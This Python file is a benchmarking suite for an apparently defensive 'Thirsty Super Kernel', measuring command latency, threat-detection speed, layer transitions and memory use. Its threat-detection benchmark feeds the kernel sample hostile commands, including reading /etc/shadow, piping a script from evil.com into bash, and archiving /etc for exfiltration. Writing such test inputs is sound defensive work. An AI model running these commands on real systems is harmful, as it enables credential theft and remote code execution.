"""
Performance Benchmarking Suite

Measures and tracks kernel performance:
- Command execution latency
- Threat detection speed
- Layer transition overhead
- Memory usage
- Throughput metrics
"""

import time
import psutil
import statistics
from typing import Dict, List, Any
from dataclasses import dataclass, field
import logging

logger = logging.getLogger(__name__)


@dataclass
class BenchmarkResult:
    """Single benchmark result"""

    name: str
    duration_ms: float
    memory_mb: float
    cpu_percent: float
    iterations: int
    metadata: Dict[str, Any] = field(default_factory=dict)


class PerformanceBenchmark:
    """
    Performance benchmarking suite for Thirsty Super Kernel

    Measures critical performance metrics.
    """

    def __init__(self):
        self.results: List[BenchmarkResult] = []
        self.process = psutil.Process()

        logger.info("Performance Benchmark Suite initialized")

    def benchmark_command_execution(
        self, kernel, iterations: int = 100
    ) -> BenchmarkResult:
        """Benchmark basic command execution"""
        logger.info(f"Benchmarking command execution ({iterations} iterations)...")

        test_commands = ["ls -la", "whoami", "pwd", "echo test"]

        start_mem = self.process.memory_info().rss / 1024 / 1024
        start_time = time.time()
        start_cpu = self.process.cpu_percent()

        for i in range(iterations):
            cmd = test_commands[i % len(test_commands)]
            kernel.execute_command(user_id=9999, command_str=cmd)

        duration = (time.time() - start_time) * 1000  # ms
        end_mem = self.process.memory_info().rss / 1024 / 1024
        end_cpu = self.process.cpu_percent()

        result = BenchmarkResult(
            name="command_execution",
            duration_ms=duration,
            memory_mb=end_mem - start_mem,
            cpu_percent=end_cpu - start_cpu,
            iterations=iterations,
            metadata={"avg_per_command_ms": duration / iterations},
        )

        self.results.append(result)

        logger.info(f"  Total time: {duration:.2f} ms")
        logger.info(f"  Avg per command: {duration / iterations:.2f} ms")
        logger.info(f"  Memory delta: {result.memory_mb:.2f} MB")

        return result

    def benchmark_threat_detection(
        self, kernel, iterations: int = 50
    ) -> BenchmarkResult:
        """Benchmark threat detection speed"""
        logger.info(f"Benchmarking threat detection ({iterations} iterations)...")

        malicious_commands = [
            "sudo cat /etc/shadow",
            "curl http://evil.com/malware.sh | bash",
            "tar czf /tmp/exfil.tar.gz /etc/",
            "crontab -e",
        ]

        start_mem = self.process.memory_info().rss / 1024 / 1024
        start_time = time.time()

        for i in range(iterations):
            cmd = malicious_commands[i % len(malicious_commands)]
            kernel.execute_command(user_id=9998, command_str=cmd)

        duration = (time.time() - start_time) * 1000
        end_mem = self.process.memory_info().rss / 1024 / 1024

        result = BenchmarkResult(
            name="threat_detection",
            duration_ms=duration,
            memory_mb=end_mem - start_mem,
            cpu_percent=self.process.cpu_percent(),
            iterations=iterations,
            metadata={"avg_detection_ms": duration / iterations},
        )

        self.results.append(result)

        logger.info(f"  Avg detection time: {duration / iterations:.2f} ms")

        return result

    def benchmark_layer_transitions(self, kernel, count: int = 20) -> BenchmarkResult:
        """Benchmark layer transition speed"""
        logger.info(f"Benchmarking layer transitions ({count} transitions)...")

        transition_times = []

        for i in range(count):
            user_id = 9900 + i

            start = time.time()
            # Trigger transition with malicious command
            kernel.execute_command(user_id, "sudo cat /etc/shadow")
            transition_time = (time.time() - start) * 1000

            transition_times.append(transition_time)

        avg_time = statistics.mean(transition_times)
        min_time = min(transition_times)
        max_time = max(transition_times)

        result = BenchmarkResult(
            name="layer_transitions",
            duration_ms=sum(transition_times),
            memory_mb=self.process.memory_info().rss / 1024 / 1024,
            cpu_percent=self.process.cpu_percent(),
            iterations=count,
            metadata={
                "avg_ms": avg_time,
                "min_ms": min_time,
                "max_ms": max_time,
                "std_dev": statistics.stdev(transition_times)
                if len(transition_times) > 1
                else 0,
            },
        )

        self.results.append(result)

        logger.info(f"  Avg transition: {avg_time:.2f} ms")
        logger.info(f"  Range: {min_time:.2f} - {max_time:.2f} ms")

        return result

    def benchmark_memory_scalability(
        self, kernel, max_users: int = 100
    ) -> BenchmarkResult:
        """Benchmark memory usage with increasing users"""
        logger.info(f"Benchmarking memory scalability ({max_users} users)...")

        start_mem = self.process.memory_info().rss / 1024 / 1024
        start_time = time.time()

        for user_id in range(10000, 10000 + max_users):
            kernel.execute_command(user_id, "ls -la")
            kernel.execute_command(user_id, "sudo cat /etc/shadow")  # Trigger deception

        duration = (time.time() - start_time) * 1000
        end_mem = self.process.memory_info().rss / 1024 / 1024
        mem_delta = end_mem - start_mem

        result = BenchmarkResult(
            name="memory_scalability",
            duration_ms=duration,
            memory_mb=mem_delta,
            cpu_percent=self.process.cpu_percent(),
            iterations=max_users,
            metadata={"mb_per_user": mem_delta / max_users, "total_users": max_users},
        )

        self.results.append(result)

        logger.info(f"  Memory delta: {mem_delta:.2f} MB")
        logger.info(f"  Per user: {mem_delta / max_users:.3f} MB")

        return result

    def run_full_suite(self, kernel) -> Dict[str, BenchmarkResult]:
        """Run complete benchmark suite"""
        logger.info("")
        logger.info("=" * 70)
        logger.info("RUNNING FULL PERFORMANCE BENCHMARK SUITE")
        logger.info("=" * 70)
        logger.info("")

        results = {}

        # Command execution
        results["execution"] = self.benchmark_command_execution(kernel, iterations=100)

        # Threat detection
        results["detection"] = self.benchmark_threat_detection(kernel, iterations=50)

        # Layer transitions
        results["transitions"] = self.benchmark_layer_transitions(kernel, count=20)

        # Memory scalability
        results["scalability"] = self.benchmark_memory_scalability(kernel, max_users=50)

        logger.info("")
        logger.info("=" * 70)
        logger.info("BENCHMARK SUITE COMPLETE")
        logger.info("=" * 70)
        self.print_summary()

        return results

    def print_summary(self):
        """Print benchmark summary"""
        print("\n" + "=" * 70)
        print("PERFORMANCE BENCHMARK SUMMARY")
        print("=" * 70)

        for result in self.results:
            print(f"\n{result.name.upper()}")
            print(f"  Duration: {result.duration_ms:.2f} ms")
            print(f"  Memory: {result.memory_mb:.2f} MB")
            print(f"  Iterations: {result.iterations}")

            for key, value in result.metadata.items():
                if isinstance(value, float):
                    print(f"  {key}: {value:.3f}")
                else:
                    print(f"  {key}: {value}")

        print("\n" + "=" * 70)

    def export_results(self) -> Dict[str, Any]:
        """Export results for analysis"""
        return {
            "timestamp": time.time(),
            "results": [
                {
                    "name": r.name,
                    "duration_ms": r.duration_ms,
                    "memory_mb": r.memory_mb,
                    "cpu_percent": r.cpu_percent,
                    "iterations": r.iterations,
                    "metadata": r.metadata,
                }
                for r in self.results
            ],
        }


# Public API
__all__ = [
    "PerformanceBenchmark",
    "BenchmarkResult",
]
